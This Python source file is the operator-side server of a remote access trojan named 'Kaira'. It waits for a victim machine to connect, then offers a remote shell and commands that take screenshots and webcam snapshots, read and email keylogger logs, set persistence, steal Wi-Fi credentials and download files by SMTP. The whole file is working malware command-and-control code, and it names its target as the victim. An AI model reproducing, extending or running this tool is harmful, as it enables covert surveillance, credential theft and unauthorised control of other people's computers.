import socket
from colorama import init,Fore
from os import system

init()


class Kaira_Server():
    def __init__(self, host, port, email, smtp_address, smtp_port, password):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((host, port))
        try:
            self.s.listen(0)
            print(Fore.GREEN + f"[+]Listening connections on IP : {host} Port : {port}\n")
            self.connection, addr = self.s.accept()
        except KeyboardInterrupt:
            print(Fore.MAGENTA + "\n[!]CTRL+C detected.Exiting...")
            exit()
        print(Fore.MAGENTA + f"[!]Connection established with : {addr}\n")
        if email and smtp_address and smtp_port and password:
            self.connection.send("truee".encode())
            email_ = email
            smtp_address_ = smtp_address
            smtp_port_ = smtp_port
            smtp_pass_ = password
            smtp_creds = email_ + "  " + smtp_address_ + "  " + smtp_port_ + "  " + smtp_pass_
            self.connection.send(smtp_creds.encode())
            self.smtp_state = self.connection.recv(1024).decode()
            if self.smtp_state == "SMTP false":
                print(Fore.RED + "[-]SMTP Authentication is failed.Maybe your SMTP creds are wrong.\nExiting...")
                exit()
            else:
                print(Fore.GREEN + "[+]SMTP authentication successful.\n")
            
        else:
            self.smtp_state = "SMTP false"
            self.connection.send("false".encode())
            print(Fore.RED + "[-]SMTP didn't configured.You will not be able to use commands that require SMTP.")
        
        self.computer_name = self.connection.recv(128).decode()


    def shell(self):
        print(Fore.BLUE + "[?]For command list, type 'help'.\n\n")
        while True:
            try:
                shell_command = input(Fore.RED + "┎──────" + Fore.MAGENTA + "(shell@" + self.computer_name + ")" + Fore.RED +"\n┃\n┗──$" + Fore.GREEN)
            except KeyboardInterrupt:
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "\n\n[!]CTRL+C detected.Exiting from shell.")
                return 0
            splitted_shell_command = shell_command.split(" ")
            if splitted_shell_command[0] == "download" and len(splitted_shell_command) > 1:
                if self.smtp_state == "SMTP true":
                    self.connection.send(shell_command.encode())
                    shell_command_output = self.connection.recv(16777216).decode()
                    print(Fore.GREEN + shell_command_output)
                else:
                    print(Fore.RED + "[-]You didn't configure SMTP to download files from victim.")

            elif shell_command == "help":
                print(Fore.GREEN + self.help_shell())

            elif shell_command == "clear":
                system("clear")

            elif shell_command == "exit":
                self.connection.send("exit".encode())
                return 0
            else:
                self.connection.send(shell_command.encode())
                shell_command_output = self.connection.recv(16777216).decode()
                print(Fore.BLUE + shell_command_output)


    def help_main(self):
        with open("modules/menu_main.txt", "r") as main_menu:
            return main_menu.read()
        
    def help_shell(self):
        with open("modules/menu_shell.txt", "r") as shell_menu:
            return shell_menu.read()

    
    def core(self):
        print(Fore.BLUE + "[?]For command list, type 'help'.\n\n")
        while True:
            try:
                command_input = input(Fore.RED + "┎──────" + Fore.BLUE + "(kaira@main)" + Fore.RED + "\n┃\n┗──$" + Fore.MAGENTA)
            except KeyboardInterrupt:
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "\n\n[!]CTRL+C detected.Exiting...")
                exit()

            if command_input == "shell":
                self.connection.send("shell".encode())
                self.shell()

            elif command_input == "screenshot":
                if self.smtp_state == "SMTP true":
                    self.connection.send("screenshot".encode())
                    screenshot_state = self.connection.recv(33).decode()
                    if screenshot_state == "[-]Screenshot can't be taken.":
                        print(Fore.RED + screenshot_state)
                        screenshot_state_2 = self.connection.recv(26).decode()
                        print(Fore.RED + screenshot_state_2)
                    else:
                        print(Fore.GREEN + screenshot_state)
                        screenshot_state_2 = self.connection.recv(29).decode()
                        if not screenshot_state_2 == "[-]Screenshot didn't sent....":
                            print(Fore.GREEN + screenshot_state_2)
                        else:
                            print(Fore.RED + screenshot_state_2)
                else:
                    print(Fore.RED + "[-]You didn't configure SMTP to view screenshots with email.")

            elif command_input == "camera_snapshot":
                if self.smtp_state == "SMTP true":
                    self.connection.send("camera_snapshot".encode())
                    camera_state = self.connection.recv(27).decode()
                    if camera_state == "[-]Can't access the camera.":
                        print(Fore.RED + camera_state)
                    else:
                        print(Fore.GREEN + camera_state)
                        camera_state_2 = self.connection.recv(34).decode()
                        if not camera_state_2 == "[-]Camera snapshot didn't sent....":
                            print(Fore.GREEN + camera_state_2)
                        else:
                            print(Fore.RED + camera_state_2)
                else:
                    print(Fore.RED + "[-]You didn't configure SMTP to view camera snapshots with email.")

            elif command_input == "read_keys":
                self.connection.send("read_keys".encode())
                log = self.connection.recv(16777216).decode()
                print(Fore.WHITE + log)
            
            elif command_input == "get_keys":
                if self.smtp_state == "SMTP true":
                    self.connection.send("get_keys".encode())
                    klog_state = self.connection.recv(27).decode()
                    if klog_state == "[+]Log file sent with SMTP.":
                        print(Fore.GREEN + klog_state)
                    else:
                        print(Fore.RED + klog_state)
                else:
                    print(Fore.RED + "[-]You didn't configure SMTP to get keylog file with email.")

            elif command_input == "persistence":
                self.connection.send("persistence".encode())
                persistence = self.connection.recv(31).decode()
                if persistence == "[+]Persistence activated.      ":
                    print(Fore.GREEN + persistence)
                else:
                    print(Fore.RED + persistence)
            
            elif command_input == "remove_persistence":
                self.connection.send("remove_persistence".encode())
                remove_persistence = self.connection.recv(33).decode()
                if remove_persistence == "[+]Persistence deactivated.      ":
                    print(Fore.GREEN + remove_persistence)
                else:
                    print(Fore.RED + remove_persistence)
            
            elif command_input == "get_wifi":
                self.connection.send("get_wifi".encode())
                wifi_ = self.connection.recv(1024).decode()
                if not wifi_ == "[-]Can't get wifi creds.":
                    print(Fore.GREEN + wifi_)
                else:
                    print(Fore.RED + wifi_)

            elif command_input == "system_info":
                self.connection.send("system_info".encode())
                system_info = self.connection.recv(16777216).decode()
                print(Fore.GREEN + system_info)

            elif command_input == "clear":
                system("clear")

            elif command_input == "exit":
                self.connection.send("exit".encode())
                print(Fore.MAGENTA + "[!]Exiting...")
                self.connection.close()
                exit()

            elif command_input == "help":
                print(Fore.GREEN + self.help_main())
            
            else:
                print(Fore.RED + "[-]Unknown command.Type 'help' for command list.")


